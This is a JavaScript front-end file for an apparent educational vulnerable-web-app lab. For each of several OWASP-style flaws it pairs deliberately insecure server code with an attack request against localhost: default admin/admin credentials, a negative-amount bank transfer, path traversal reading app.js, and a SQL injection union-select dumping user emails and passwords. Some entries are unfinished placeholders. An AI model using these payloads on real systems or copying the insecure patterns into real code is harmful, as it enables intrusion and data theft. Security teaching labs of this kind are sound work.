const response_output = document.getElementById("response-output");
const vulnerableCode = document.getElementById("vulnerable-code");
const secureCode = document.getElementById("secure-code");
const exploitSelect = document.getElementById("exploit-select");
const attackRequest = document.getElementById("attack-code");
const iframe = document.getElementById("exploit-iframe");
const urlbar = document.getElementById("url-bar");

const exploitData = {
  "Default Credentials": {
    vulnerable: `  let { username, password } = req.body;
  if (username === 'admin' && password === 'admin') {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
  } else {
    res.sendFile(path.join(__dirname, 'public', 'failed.html'));
  }`,
    url: "http://localhost:3001/login",
    secure: `Secure version not yet implemented`,
    successful_substring: "Login Successful!",
    attack_request: `await fetch('http://localhost:3001/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username: 'admin', password: 'admin' }),
    });`,
    custom_behavior: false,
    server_side_exploit: true,
    documentation_html_filepath: "pathtraversal.html"
  },
  "Insecure Design": {
    vulnerable: `  let { recipient, amount } = req.body;
  amount = parseInt(amount);
  if (typeof amount === 'number') {
    if (amount > accounts.l33th4x0r) {
      amount = accounts.l33th4x0r;
    }
    accounts.l33th4x0r -= amount;
    accounts[recipient] += amount;
    res.json({ accountInfo: accounts, amountDeducted: amount });
  }
  else { 
    res.send("Invalid data") 
  }`,
    url: "http://localhost:3001/bank",
    secure: `Secure version not yet implemented`,
    successful_substring: "-$-5000",
    attack_request: `document.getElementById('amount').value = '-5000';
document.getElementById('recipient').value = 'john';
document.querySelector('button').click();`,
    server_side_exploit: false,
    documentation_html_filepath: "placeholder.html"
  },
  "Path Traversal": {
    vulnerable: `let filePath = path.resolve(__dirname + req.params[0]);
      if (fs.existsSync(filePath)) {
          res.sendFile(filePath);
      } else {
          res.send("File at " + filePath + " doesn't exist.");
      }`,
    url: "http://localhost:3001/textreader",
    secure: `Secure version not yet implemented`,
    successful_substring: "secret",
    attack_request: "window.location.href = 'http://localhost:3001/textreader?fileName=app.js'",
    custom_behavior: true,
    server_side_exploit: false,
    documentation_html_filepath: "placeholder.html"
  },
  "Software and Data Integrity Failures": {
    vulnerable: `??????????????`,
    url: "http://localhost:3000/#/search?q=advanced",
    secure: `Secure version not yet implemented`,
    successful_substring: "secret",
    attack_request: "????????",
    custom_behavior: true,
    server_side_exploit: true,
    documentation_html_filepath: "placeholder.html"
  },
  "Security Logging and Monitoring Failures": {
    vulnerable: `??????????????`,
    url: "http://localhost:3000/rest/products/search?q=",
    secure: `Secure version not yet implemented`,
    successful_substring: "secret",
    attack_request: "window.location.href = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'",
    custom_behavior: true,
    server_side_exploit: false,
    documentation_html_filepath: "placeholder.html"
  }
}

function updateCode() {
  const selectedExploit = exploitSelect.value;
  localStorage.setItem('selectedExploit', selectedExploit);

  const exploit = exploitData[selectedExploit];
  vulnerableCode.textContent = exploit.vulnerable;
  secureCode.textContent = exploit.secure;
  attackRequest.textContent = exploit.attack_request;
  iframe.src = exploit.url;
  urlbar.value = exploit.url;
}


async function sendExploit() {
  try {
    let selectedExploit = exploitSelect.value;
    if (exploitData[selectedExploit].server_side_exploit == true) { // the exploit is to be sent from the server, and the iframe will be overwritten with the response
      const response = await fetch('/exploit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ exploitType: selectedExploit })
      });
      if (response.ok) {
        const result = await response.text();

        if (exploitData[selectedExploit].custom_behavior == true) {
          if (selectedExploit == "Software and Data Integrity Failures") {
            location.reload()
          }
        } else {
          // https://stackoverflow.com/questions/8240101/set-content-of-iframe
          iframe.src = 'about:blank';
            iframe.contentWindow.document.open();
            iframe.contentWindow.document.write(result);
            iframe.contentWindow.document.close();
          console.log("Response body:", result);

        }
        if (result.includes(exploitData[selectedExploit].successful_substring)) {
          response_output.innerHTML = "The attack was successful!";
        } else {
          response_output.innerHTML = "The exploit failed.";
        }
      } else {
        console.log("Error:", response.status, response.statusText);
      }
    } else { // the exploit is to be sent from the iframe.
      if (exploitData[selectedExploit].custom_behavior == true) {
        if (selectedExploit == "Security Logging and Monitoring Failures") {
          let url = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'
          urlbar.value = url
          iframe.src = url
        } if(selectedExploit == "Path Traversal"){
        urlbar.value = "http://localhost:3001/textreader?fileName=app.js"
        }
      }
      console.log("Executing in iframe " + exploitData[selectedExploit].attack_request)
      iframe.contentWindow.eval(exploitData[selectedExploit].attack_request);
      result = iframe.contentWindow.document.body.innerText;

      const checkInterval = 500;
      const timeout = 5000;
      let elapsedTime = 0;

      const intervalId = setTimeout(() => {
        const result = iframe.contentWindow.document.body.innerText;
        if (result.includes(exploitData[selectedExploit].successful_substring)) {
          clearInterval(intervalId);
          response_output.innerHTML = "The attack was successful!";
        } else if (elapsedTime >= timeout) {
          clearInterval(intervalId);
          response_output.innerHTML = "The exploit failed.";
        }

        elapsedTime += checkInterval;
      }, checkInterval);
    }
  } catch (error) {
    response_output.innerHTML = "Error: " + error;
  }
}


function addExploitOptions() {
  selectElement = document.getElementById("exploit-select")
  for (let key of Object.keys(exploitData)) {
    const option = document.createElement('option');
    option.value = key;
    option.textContent = key;
    selectElement.appendChild(option);
  }
}
addExploitOptions();


const savedExploit = localStorage.getItem('selectedExploit');
if (savedExploit != null) {
  exploitSelect.value = savedExploit;
} else {
  exploitSelect.value = Object.keys(exploitData)[0];
  localStorage.setItem('selectedExploit', exploitSelect.value);
}

urlbar.addEventListener("keydown", function(event) {
  if (event.key === "Enter") {
    iframe.src = urlbar.value;
  }
});

exploitSelect.addEventListener("change", updateCode);

updateCode();
